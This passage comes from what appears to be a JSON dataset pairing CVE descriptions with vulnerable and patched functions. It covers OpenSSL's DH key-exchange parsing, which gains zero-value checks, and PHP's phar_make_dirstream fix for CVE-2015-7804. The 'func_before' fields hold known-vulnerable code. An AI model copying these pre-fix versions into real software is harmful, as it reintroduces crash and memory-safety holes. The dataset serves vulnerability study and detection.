}\n\n/* We must check if there is a certificate */\n# ifndef OPENSSL_NO_RSA\n        if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n# else\n        if (0) ;\n# endif\n# ifndef OPENSSL_NO_DSA\n        else if (alg_a & SSL_aDSS)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_DSA_SIGN].\n                                x509);\n# endif\n    } else\n#endif                          /* !OPENSSL_NO_SRP */\n#ifndef OPENSSL_NO_RSA\n    if (alg_k & SSL_kRSA) {\n        /* Temporary RSA keys only allowed in export ciphersuites */\n        if (!SSL_C_IS_EXPORT(s->s3->tmp.new_cipher)) {\n            al = SSL_AD_UNEXPECTED_MESSAGE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n            goto f_err;\n        }\n        if ((rsa = RSA_new()) == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto err;\n        }\n\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_RSA_MODULUS_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(rsa->n = BN_bin2bn(p, i, rsa->n))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_RSA_E_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(rsa->e = BN_bin2bn(p, i, rsa->e))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n        n -= param_len;\n\n        /* this should be because we are using an export cipher */\n        if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n        else {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_INTERNAL_ERROR);\n            goto err;\n        }\n\n        if (EVP_PKEY_bits(pkey) <= SSL_C_EXPORT_PKEYLENGTH(s->s3->tmp.new_cipher)) {\n            al = SSL_AD_UNEXPECTED_MESSAGE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n            goto f_err;\n        }\n\n        s->session->sess_cert->peer_rsa_tmp = rsa;\n        rsa = NULL;\n    }\n#else                           /* OPENSSL_NO_RSA */\n    if (0) ;\n#endif\n#ifndef OPENSSL_NO_DH\n    else if (alg_k & SSL_kEDH) {\n        if ((dh = DH_new()) == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_DH_LIB);\n            goto err;\n        }\n\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_P_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(dh->p = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (BN_is_zero(dh->p)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_P_VALUE);\n            goto f_err;\n        }\n\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_G_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(dh->g = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (BN_is_zero(dh->g)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_G_VALUE);\n            goto f_err;\n        }\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_PUB_KEY_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(dh->pub_key = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n        n -= param_len;\n\n        if (BN_is_zero(dh->pub_key)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_PUB_KEY_VALUE);\n            goto f_err;\n        }\n\n# ifndef OPENSSL_NO_RSA\n        if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n# else\n        if (0) ;\n# endif\n# ifndef OPENSSL_NO_DSA\n        else if (alg_a & SSL_aDSS)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_DSA_SIGN].\n                                x509);\n# endif\n        /* else anonymous DH, so no certificate or pkey. */\n\n        s->session->sess_cert->peer_dh_tmp = dh;\n        dh = NULL;\n    } else if ((alg_k & SSL_kDHr) || (alg_k & SSL_kDHd)) {\n        al = SSL_AD_ILLEGAL_PARAMETER;\n        SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n               SSL_R_TRIED_TO_USE_UNSUPPORTED_CIPHER);\n        goto f_err;\n    }\n#endif                          /* !OPENSSL_NO_DH */\n\n#ifndef OPENSSL_NO_ECDH\n    else if (alg_k & SSL_kEECDH) {\n        EC_GROUP *ngroup;\n        const EC_GROUP *group;\n\n        if ((ecdh = EC_KEY_new()) == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto err;\n        }\n\n        /*\n         * Extract elliptic curve parameters and the server's ephemeral ECDH\n         * public key. Keep accumulating lengths of various components in\n         * param_len and make sure it never exceeds n.\n         */\n\n        /*\n         * XXX: For now we only support named (not generic) curves and the\n         * ECParameters in this case is just three bytes. We also need one\n         * byte for the length of the encoded point\n         */\n        param_len = 4;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        /*\n         * Check curve is one of our preferences, if not server has sent an\n         * invalid curve. ECParameters is 3 bytes.\n         */\n        if (!tls1_check_curve(s, p, 3)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_WRONG_CURVE);\n            goto f_err;\n        }\n\n        if ((curve_nid = tls1_ec_curve_id2nid(*(p + 2))) == 0) {\n            al = SSL_AD_INTERNAL_ERROR;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n                   SSL_R_UNABLE_TO_FIND_ECDH_PARAMETERS);\n            goto f_err;\n        }\n\n        ngroup = EC_GROUP_new_by_curve_name(curve_nid);\n        if (ngroup == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_EC_LIB);\n            goto err;\n        }\n        if (EC_KEY_set_group(ecdh, ngroup) == 0) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_EC_LIB);\n            goto err;\n        }\n        EC_GROUP_free(ngroup);\n\n        group = EC_KEY_get0_group(ecdh);\n\n        if (SSL_C_IS_EXPORT(s->s3->tmp.new_cipher) &&\n            (EC_GROUP_get_degree(group) > 163)) {\n            al = SSL_AD_EXPORT_RESTRICTION;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n                   SSL_R_ECGROUP_TOO_LARGE_FOR_CIPHER);\n            goto f_err;\n        }\n\n        p += 3;\n\n        /* Next, get the encoded ECPoint */\n        if (((srvr_ecpoint = EC_POINT_new(group)) == NULL) ||\n            ((bn_ctx = BN_CTX_new()) == NULL)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto err;\n        }\n\n        encoded_pt_len = *p;    /* length of encoded point */\n        p += 1;\n\n        if ((encoded_pt_len > n - param_len) ||\n            (EC_POINT_oct2point(group, srvr_ecpoint,\n                                p, encoded_pt_len, bn_ctx) == 0)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_ECPOINT);\n            goto f_err;\n        }\n        param_len += encoded_pt_len;\n\n        n -= param_len;\n        p += encoded_pt_len;\n\n        /*\n         * The ECC/TLS specification does not mention the use of DSA to sign\n         * ECParameters in the server key exchange message. We do support RSA\n         * and ECDSA.\n         */\n        if (0) ;\n# ifndef OPENSSL_NO_RSA\n        else if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n# endif\n# ifndef OPENSSL_NO_ECDSA\n        else if (alg_a & SSL_aECDSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_ECC].x509);\n# endif\n        /* else anonymous ECDH, so no certificate or pkey. */\n        EC_KEY_set_public_key(ecdh, srvr_ecpoint);\n        s->session->sess_cert->peer_ecdh_tmp = ecdh;\n        ecdh = NULL;\n        BN_CTX_free(bn_ctx);\n        bn_ctx = NULL;\n        EC_POINT_free(srvr_ecpoint);\n        srvr_ecpoint = NULL;\n    } else if (alg_k) {\n        al = SSL_AD_UNEXPECTED_MESSAGE;\n        SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n        goto f_err;\n    }\n#endif                          /* !OPENSSL_NO_ECDH */\n\n    /* p points to the next byte, there are 'n' bytes left */\n\n    /* if it was signed, check the signature */\n    if (pkey != NULL) {\n        if (SSL_USE_SIGALGS(s)) {\n            int rv;\n            if (2 > n) {\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n                goto f_err;\n            }\n            rv = tls12_check_peer_sigalg(&md, s, p, pkey);\n            if (rv == -1)\n                goto err;\n            else if (rv == 0) {\n                goto f_err;\n            }\n#ifdef SSL_DEBUG\n            fprintf(stderr, \"USING TLSv1.2 HASH %s\\n\", EVP_MD_name(md));\n#endif\n            p += 2;\n            n -= 2;\n        } else\n            md = EVP_sha1();\n\n        if (2 > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n        n -= 2;\n        j = EVP_PKEY_size(pkey);\n\n        /*\n         * Check signature length. If n is 0 then signature is empty\n         */\n        if ((i != n) || (n > j) || (n <= 0)) {\n            /* wrong packet length */\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_WRONG_SIGNATURE_LENGTH);\n            goto f_err;\n        }\n#ifndef OPENSSL_NO_RSA\n        if (pkey->type == EVP_PKEY_RSA && !SSL_USE_SIGALGS(s)) {\n            int num;\n            unsigned int size;\n\n            j = 0;\n            q = md_buf;\n            for (num = 2; num > 0; num--) {\n                EVP_MD_CTX_set_flags(&md_ctx, EVP_MD_CTX_FLAG_NON_FIPS_ALLOW);\n                EVP_DigestInit_ex(&md_ctx, (num == 2)\n                                  ? s->ctx->md5 : s->ctx->sha1, NULL);\n                EVP_DigestUpdate(&md_ctx, &(s->s3->client_random[0]),\n                                 SSL3_RANDOM_SIZE);\n                EVP_DigestUpdate(&md_ctx, &(s->s3->server_random[0]),\n                                 SSL3_RANDOM_SIZE);\n                EVP_DigestUpdate(&md_ctx, param, param_len);\n                EVP_DigestFinal_ex(&md_ctx, q, &size);\n                q += size;\n                j += size;\n            }\n            i = RSA_verify(NID_md5_sha1, md_buf, j, p, n, pkey->pkey.rsa);\n            if (i < 0) {\n                al = SSL_AD_DECRYPT_ERROR;\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_RSA_DECRYPT);\n                goto f_err;\n            }\n            if (i == 0) {\n                /* bad signature */\n                al = SSL_AD_DECRYPT_ERROR;\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SIGNATURE);\n                goto f_err;\n            }\n        } else\n#endif\n        {\n            EVP_VerifyInit_ex(&md_ctx, md, NULL);\n            EVP_VerifyUpdate(&md_ctx, &(s->s3->client_random[0]),\n                             SSL3_RANDOM_SIZE);\n            EVP_VerifyUpdate(&md_ctx, &(s->s3->server_random[0]),\n                             SSL3_RANDOM_SIZE);\n            EVP_VerifyUpdate(&md_ctx, param, param_len);\n            if (EVP_VerifyFinal(&md_ctx, p, (int)n, pkey) <= 0) {\n                /* bad signature */\n                al = SSL_AD_DECRYPT_ERROR;\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SIGNATURE);\n                goto f_err;\n            }\n        }\n    } else {\n        /* aNULL, aSRP or kPSK do not need public keys */\n        if (!(alg_a & (SSL_aNULL | SSL_aSRP)) && !(alg_k & SSL_kPSK)) {\n            /* Might be wrong key type, check it */\n            if (ssl3_check_cert_and_algorithm(s))\n                /* Otherwise this shouldn't happen */\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_INTERNAL_ERROR);\n            goto err;\n        }\n        /* still data left over */\n        if (n != 0) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_EXTRA_DATA_IN_MESSAGE);\n            goto f_err;\n        }\n    }\n    EVP_PKEY_free(pkey);\n    EVP_MD_CTX_cleanup(&md_ctx);\n    return (1);\n f_err:\n    ssl3_send_alert(s, SSL3_AL_FATAL, al);\n err:\n    EVP_PKEY_free(pkey);\n#ifndef OPENSSL_NO_RSA\n    if (rsa != NULL)\n        RSA_free(rsa);\n#endif\n#ifndef OPENSSL_NO_DH\n    if (dh != NULL)\n        DH_free(dh);\n#endif\n#ifndef OPENSSL_NO_ECDH\n    BN_CTX_free(bn_ctx);\n    EC_POINT_free(srvr_ecpoint);\n    if (ecdh != NULL)\n        EC_KEY_free(ecdh);\n#endif\n    EVP_MD_CTX_cleanup(&md_ctx);\n    s->state = SSL_ST_ERR;\n    return (-1);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -341,6 +341,12 @@\n         }\n         p += i;\n \n+        if (BN_is_zero(dh->p)) {\n+            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_P_VALUE);\n+            goto f_err;\n+        }\n+\n+\n         if (2 > n - param_len) {\n             SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n             goto f_err;\n@@ -361,6 +367,11 @@\n         }\n         p += i;\n \n+        if (BN_is_zero(dh->g)) {\n+            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_G_VALUE);\n+            goto f_err;\n+        }\n+\n         if (2 > n - param_len) {\n             SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n             goto f_err;\n@@ -381,6 +392,11 @@\n         }\n         p += i;\n         n -= param_len;\n+\n+        if (BN_is_zero(dh->pub_key)) {\n+            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_PUB_KEY_VALUE);\n+            goto f_err;\n+        }\n \n # ifndef OPENSSL_NO_RSA\n         if (alg_a & SSL_aRSA)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (BN_is_zero(dh->p)) {",
                "            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_P_VALUE);",
                "            goto f_err;",
                "        }",
                "",
                "",
                "        if (BN_is_zero(dh->g)) {",
                "            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_G_VALUE);",
                "            goto f_err;",
                "        }",
                "",
                "",
                "        if (BN_is_zero(dh->pub_key)) {",
                "            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_PUB_KEY_VALUE);",
                "            goto f_err;",
                "        }"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-7804",
        "func_name": "php/php-src/phar_make_dirstream",
        "description": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.",
        "git_url": "https://github.com/php/php-src/commit/e78ac461dbefb7c4a3e9fde78d50fbc56b7b0183",
        "commit_title": "FIx bug #70433 - Uninitialized pointer in phar_make_dirstream when zip entry filename is \"/\"",
        "commit_text": "",
        "func_before": "static php_stream *phar_make_dirstream(char *dir, HashTable *manifest TSRMLS_DC) /* {{{ */\n{\n\tHashTable *data;\n\tint dirlen = strlen(dir);\n\tphar_zstr key;\n\tchar *entry, *found, *save, *str_key;\n\tuint keylen;\n\tulong unused;\n\n\tALLOC_HASHTABLE(data);\n\tzend_hash_init(data, 64, zend_get_hash_value, NULL, 0);\n\n\tif ((*dir == '/' && dirlen == 1 && (manifest->nNumOfElements == 0)) || (dirlen >= sizeof(\".phar\")-1 && !memcmp(dir, \".phar\", sizeof(\".phar\")-1))) {\n\t\t/* make empty root directory for empty phar */\n\t\t/* make empty directory for .phar magic directory */\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n\n\tzend_hash_internal_pointer_reset(manifest);\n\n\twhile (FAILURE != zend_hash_has_more_elements(manifest)) {\n\t\tif (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n\t\t\tbreak;\n\t\t}\n\n\t\tPHAR_STR(key, str_key);\n\n\t\tif (keylen <= (uint)dirlen) {\n\t\t\tif (keylen < (uint)dirlen || !strncmp(str_key, dir, dirlen)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tif (*dir == '/') {\n\t\t\t/* root directory */\n\t\t\tif (keylen >= sizeof(\".phar\")-1 && !memcmp(str_key, \".phar\", sizeof(\".phar\")-1)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t/* do not add any magic entries to this directory */\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (NULL != (found = (char *) memchr(str_key, '/', keylen))) {\n\t\t\t\t/* the entry has a path separator and is a subdirectory */\n\t\t\t\tentry = (char *) safe_emalloc(found - str_key, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, found - str_key);\n\t\t\t\tkeylen = found - str_key;\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t} else {\n\t\t\t\tentry = (char *) safe_emalloc(keylen, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, keylen);\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t}\n\n\t\t\tPHAR_STR_FREE(str_key);\n\t\t\tgoto PHAR_ADD_ENTRY;\n\t\t} else {\n\t\t\tif (0 != memcmp(str_key, dir, dirlen)) {\n\t\t\t\t/* entry in directory not found */\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} else {\n\t\t\t\tif (str_key[dirlen] != '/') {\n\t\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tsave = str_key;\n\t\tsave += dirlen + 1; /* seek to just past the path separator */\n\n\t\tif (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {\n\t\t\t/* is subdirectory */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(found - save + dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, found - save - dirlen - 1);\n\t\t\tkeylen = found - save - dirlen - 1;\n\t\t\tentry[keylen] = '\\0';\n\t\t} else {\n\t\t\t/* is file */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(keylen - dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, keylen - dirlen - 1);\n\t\t\tentry[keylen - dirlen - 1] = '\\0';\n\t\t\tkeylen = keylen - dirlen - 1;\n\t\t}\n\t\tPHAR_STR_FREE(str_key);\nPHAR_ADD_ENTRY:\n\t\tif (keylen) {\n\t\t\tphar_add_empty(data, entry, keylen);\n\t\t}\n\n\t\tefree(entry);\n\n\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (FAILURE != zend_hash_has_more_elements(data)) {\n\t\tefree(dir);\n\t\tif (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {\n\t\t\tFREE_HASHTABLE(data);\n\t\t\treturn NULL;\n\t\t}\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t} else {\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n}",
        "func": "static php_stream *phar_make_dirstream(char *dir, HashTable *manifest TSRMLS_DC) /* {{{ */\n{\n\tHashTable *data;\n\tint dirlen = strlen(dir);\n\tphar_zstr key;\n\tchar *entry, *found, *save, *str_key;\n\tuint keylen;\n\tulong unused;\n\n\tALLOC_HASHTABLE(data);\n\tzend_hash_init(data, 64, zend_get_hash_value, NULL, 0);\n\n\tif ((*dir == '/' && dirlen == 1 && (manifest->nNumOfElements == 0)) || (dirlen >= sizeof(\".phar\")-1 && !memcmp(dir, \".phar\", sizeof(\".phar\")-1))) {\n\t\t/* make empty root directory for empty phar */\n\t\t/* make empty directory for .phar magic directory */\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n\n\tzend_hash_internal_pointer_reset(manifest);\n\n\twhile (FAILURE != zend_hash_has_more_elements(manifest)) {\n\t\tif (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n\t\t\tbreak;\n\t\t}\n\n\t\tPHAR_STR(key, str_key);\n\n\t\tif (keylen <= (uint)dirlen) {\n\t\t\tif (keylen < (uint)dirlen || !strncmp(str_key, dir, dirlen)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tif (*dir == '/') {\n\t\t\t/* root directory */\n\t\t\tif (keylen >= sizeof(\".phar\")-1 && !memcmp(str_key, \".phar\", sizeof(\".phar\")-1)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t/* do not add any magic entries to this directory */\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (NULL != (found = (char *) memchr(str_key, '/', keylen))) {\n\t\t\t\t/* the entry has a path separator and is a subdirectory */\n\t\t\t\tentry = (char *) safe_emalloc(found - str_key, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, found - str_key);\n\t\t\t\tkeylen = found - str_key;\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t} else {\n\t\t\t\tentry = (char *) safe_emalloc(keylen, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, keylen);\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t}\n\n\t\t\tPHAR_STR_FREE(str_key);\n\t\t\tgoto PHAR_ADD_ENTRY;\n\t\t} else {\n\t\t\tif (0 != memcmp(str_key, dir, dirlen)) {\n\t\t\t\t/* entry in directory not found */\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} else {\n\t\t\t\tif (str_key[dirlen] != '/') {\n\t\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tsave = str_key;\n\t\tsave += dirlen + 1; /* seek to just past the path separator */\n\n\t\tif (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {\n\t\t\t/* is subdirectory */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(found - save + dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, found - save - dirlen - 1);\n\t\t\tkeylen = found - save - dirlen - 1;\n\t\t\tentry[keylen] = '\\0';\n\t\t} else {\n\t\t\t/* is file */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(keylen - dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, keylen - dirlen - 1);\n\t\t\tentry[keylen - dirlen - 1] = '\\0';\n\t\t\tkeylen = keylen - dirlen - 1;\n\t\t}\n\t\tPHAR_STR_FREE(str_key);\nPHAR_ADD_ENTRY:\n\t\tif (keylen) {\n\t\t\tphar_add_empty(data, entry, keylen);\n\t\t}\n\n\t\tefree(entry);\n\n\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (FAILURE != zend_hash_has_more_elements(data)) {\n\t\tefree(dir);\n\t\tif (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {\n\t\t\tFREE_HASHTABLE(data);\n\t\t\treturn NULL;\n\t\t}\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t} else {\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -20,7 +20,7 @@\n \tzend_hash_internal_pointer_reset(manifest);\n \n \twhile (FAILURE != zend_hash_has_more_elements(manifest)) {\n-\t\tif (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n+\t\tif (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n \t\t\tbreak;\n \t\t}\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tif (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {"
            ],
            "added_lines": [
                "\t\tif (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-7804",
        "func_name": "php/php-src/phar_add_virtual_dirs",
        "description": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.",
        "git_url": "https://github.com/php/php-src/commit/1ddf72180a52d247db88ea42a3e35f824a8fbda1",
        "commit_title": "Better fix for bug #70433",
        "commit_text": "",
        "func_before": "void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */\n{\n\tconst char *s;\n\n\twhile ((s = zend_memrchr(filename, '/', filename_len))) {\n\t\tfilename_len = s - filename;\n\t\tif (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n\t\t\tbreak;\n\t\t}\n\t}\n}",
